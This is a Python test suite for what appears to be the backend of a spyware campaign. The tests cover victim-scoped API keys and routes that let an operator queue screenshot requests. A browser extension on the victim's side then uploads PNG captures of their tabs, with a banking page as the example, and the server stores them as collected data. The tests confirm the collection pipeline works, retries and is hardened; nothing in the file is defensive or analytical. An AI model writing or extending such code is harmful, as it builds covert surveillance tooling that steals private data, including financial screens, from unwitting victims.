import base64
import os
import tempfile
import unittest
from unittest.mock import patch

from fastapi import FastAPI
from fastapi.testclient import TestClient
from pydantic import ValidationError


TEST_ENV = {
    "CAMPAIGN_ID": "49d28a23",
    "INTERNAL_API_KEY": "campaign-internal-key",
    "GATEWAY_AUTH_KEY": "gateway-auth-key",
    "SESSION_TOKEN_SECRET": "session-token-secret",
}

with patch.dict(os.environ, TEST_ENV):
    from config import settings
    from core.request_models import SnapshotUploadRequest
    from core.snapshot_requests import (
        REQUEST_TTL_SECONDS,
        _pending,
        _lock,
        register,
    )
    from core.victim_auth import derive_victim_api_key
    from routes.private import api_router

import core.snapshot_requests as snapshot_requests_module


PNG_BYTES = b"\x89PNG\r\n\x1a\n" + b"0" * 128
PNG_DATA_URL = "data:image/png;base64," + base64.b64encode(PNG_BYTES).decode()


def victim_headers(victim_id):
    return {
        "X-Victim-API-Key": derive_victim_api_key(
            settings.INTERNAL_API_KEY,
            victim_id,
        )
    }


class SnapshotRequestModelTests(unittest.TestCase):
    def test_rejects_invalid_base64(self):
        with self.assertRaises(ValidationError):
            SnapshotUploadRequest(request_id="abc123", image="not-base64!!")

    def test_rejects_non_png_payload(self):
        image = base64.b64encode(b"GIF89a" + b"0" * 64).decode()
        with self.assertRaises(ValidationError):
            SnapshotUploadRequest(request_id="abc123", image=image)

    def test_rejects_non_png_data_url(self):
        image = "data:image/gif;base64," + base64.b64encode(b"GIF89a").decode()
        with self.assertRaises(ValidationError):
            SnapshotUploadRequest(request_id="abc123", image=image)

    def test_rejects_oversize_image(self):
        with patch.dict(os.environ, {"MAX_UPLOAD_BYTES": "64"}):
            image = base64.b64encode(PNG_BYTES).decode()
            with self.assertRaises(ValidationError):
                SnapshotUploadRequest(request_id="abc123", image=image)

    def test_rejects_extra_fields(self):
        with self.assertRaises(ValidationError):
            SnapshotUploadRequest(
                request_id="abc123",
                image=PNG_DATA_URL,
                url="https://example.com",
                title="Example",
                unexpected="field",
            )

    def test_rejects_malformed_request_id(self):
        with self.assertRaises(ValidationError):
            SnapshotUploadRequest(request_id="../escape", image=PNG_DATA_URL)

    def test_accepts_data_url_and_plain_base64(self):
        request = SnapshotUploadRequest(
            request_id="abc123",
            image=PNG_DATA_URL,
            url="https://example.com",
            title="Example",
        )
        self.assertEqual(request.request_id, "abc123")

        plain = SnapshotUploadRequest(
            request_id="abc123",
            image=base64.b64encode(PNG_BYTES).decode(),
        )
        self.assertEqual(plain.url, "")


class SnapshotRegistryTests(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):
        async with _lock:
            _pending.clear()

    async def test_requests_expire_after_ttl(self):
        request = await register("victim-a")

        async with _lock:
            _pending[request["id"]]["requested_at"] -= (
                REQUEST_TTL_SECONDS + 1
            )

        self.assertEqual(await snapshot_requests_module.pending_for("victim-a"), [])
        self.assertFalse(
            await snapshot_requests_module.claim("victim-a", request["id"])
        )

    async def test_registry_is_bounded(self):
        for _ in range(snapshot_requests_module.MAX_PENDING_REQUESTS + 5):
            await register("victim-b")

        pending = await snapshot_requests_module.pending_for("victim-b")
        self.assertEqual(len(pending), snapshot_requests_module.MAX_PENDING_REQUESTS)

    async def test_claim_is_scoped_to_victim(self):
        request = await register("victim-c")

        self.assertFalse(
            await snapshot_requests_module.claim("victim-d", request["id"])
        )
        self.assertTrue(
            await snapshot_requests_module.claim("victim-c", request["id"])
        )
        self.assertFalse(
            await snapshot_requests_module.claim("victim-c", request["id"])
        )


class SnapshotRouteTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        app = FastAPI()
        app.include_router(api_router)
        cls.client = TestClient(app)

    def setUp(self):
        async def _clear():
            async with _lock:
                _pending.clear()

        import asyncio

        asyncio.run(_clear())
        self.storage = tempfile.TemporaryDirectory()
        self.settings_patch = patch.object(
            settings,
            "STORAGE_PATH",
            self.storage.name,
        )
        self.settings_patch.start()
        self.save_patch = patch(
            "routes.private_collection.save_data_collection",
            return_value="record-1",
        )
        self.mock_save = self.save_patch.start()

    def tearDown(self):
        self.save_patch.stop()
        self.settings_patch.stop()
        self.storage.cleanup()

    def test_poll_and_upload_require_victim_key(self):
        response = self.client.get("/api/sessions/victim-1/snapshot-requests")
        self.assertEqual(response.status_code, 403)

        response = self.client.post(
            "/api/sessions/victim-1/snapshot",
            json={"request_id": "abc123", "image": PNG_DATA_URL},
        )
        self.assertEqual(response.status_code, 403)

    def test_registration_requires_internal_key(self):
        response = self.client.post("/api/sessions/victim-1/snapshot-requests")
        self.assertEqual(response.status_code, 403)

        response = self.client.post(
            "/api/sessions/victim-1/snapshot-requests",
            headers={"X-Internal-API-Key": "wrong"},
        )
        self.assertEqual(response.status_code, 403)

    def test_register_poll_capture_and_record(self):
        victim_id = "victim-e2e"

        response = self.client.post(
            f"/api/sessions/{victim_id}/snapshot-requests",
            headers={"X-Internal-API-Key": settings.INTERNAL_API_KEY},
        )
        self.assertEqual(response.status_code, 200)
        request_id = response.json()["request_id"]
        self.assertTrue(request_id)

        response = self.client.get(
            f"/api/sessions/{victim_id}/snapshot-requests",
            headers=victim_headers(victim_id),
        )
        self.assertEqual(response.status_code, 200)
        pending = response.json()["pending"]
        self.assertEqual([item["id"] for item in pending], [request_id])
        self.assertTrue(pending[0]["requested_at"])

        response = self.client.post(
            f"/api/sessions/{victim_id}/snapshot",
            headers=victim_headers(victim_id),
            json={
                "request_id": request_id,
                "image": PNG_DATA_URL,
                "url": "https://example.com/banking",
                "title": "Banking",
            },
        )
        self.assertEqual(response.status_code, 200)
        relative_path = response.json()["file_path"]
        self.assertTrue(relative_path.startswith("snapshots/"))
        self.assertTrue(relative_path.endswith(".png"))

        stored = os.path.join(
            self.storage.name,
            victim_id,
            relative_path.replace("/", os.sep),
        )
        with open(stored, "rb") as snapshot_file:
            self.assertEqual(snapshot_file.read(), PNG_BYTES)

        self.mock_save.assert_called_once()
        _, kwargs = self.mock_save.call_args
        self.assertEqual(kwargs["victim_id"], victim_id)
        self.assertEqual(kwargs["data_type"], "screenshot")
        self.assertEqual(kwargs["file_path"], relative_path)
        self.assertEqual(kwargs["file_size"], len(PNG_BYTES))
        self.assertEqual(kwargs["metadata"]["request_id"], request_id)
        self.assertEqual(kwargs["metadata"]["url"], "https://example.com/banking")
        self.assertEqual(kwargs["metadata"]["capture_mode"], "browser_tab")

        # The request is fulfilled: no longer pending, re-upload is rejected.
        response = self.client.get(
            f"/api/sessions/{victim_id}/snapshot-requests",
            headers=victim_headers(victim_id),
        )
        self.assertIsNone(response.json()["pending"])

        response = self.client.post(
            f"/api/sessions/{victim_id}/snapshot",
            headers=victim_headers(victim_id),
            json={"request_id": request_id, "image": PNG_DATA_URL},
        )
        self.assertEqual(response.status_code, 404)

    def test_upload_with_unknown_request_is_rejected(self):
        response = self.client.post(
            "/api/sessions/victim-unknown/snapshot",
            headers=victim_headers("victim-unknown"),
            json={"request_id": "doesnotexist", "image": PNG_DATA_URL},
        )
        self.assertEqual(response.status_code, 404)

    def test_upload_with_invalid_image_is_rejected(self):
        victim_id = "victim-badimg"
        response = self.client.post(
            f"/api/sessions/{victim_id}/snapshot-requests",
            headers={"X-Internal-API-Key": settings.INTERNAL_API_KEY},
        )
        request_id = response.json()["request_id"]

        response = self.client.post(
            f"/api/sessions/{victim_id}/snapshot",
            headers=victim_headers(victim_id),
            json={"request_id": request_id, "image": "not-base64!!"},
        )
        self.assertEqual(response.status_code, 422)

        response = self.client.post(
            f"/api/sessions/{victim_id}/snapshot",
            headers=victim_headers(victim_id),
            json={
                "request_id": request_id,
                "image": PNG_DATA_URL,
                "extra": "field",
            },
        )
        self.assertEqual(response.status_code, 422)

        # The request stays pending so the extension can retry.
        response = self.client.get(
            f"/api/sessions/{victim_id}/snapshot-requests",
            headers=victim_headers(victim_id),
        )
        self.assertEqual(
            [item["id"] for item in response.json()["pending"]],
            [request_id],
        )


if __name__ == "__main__":
    unittest.main()
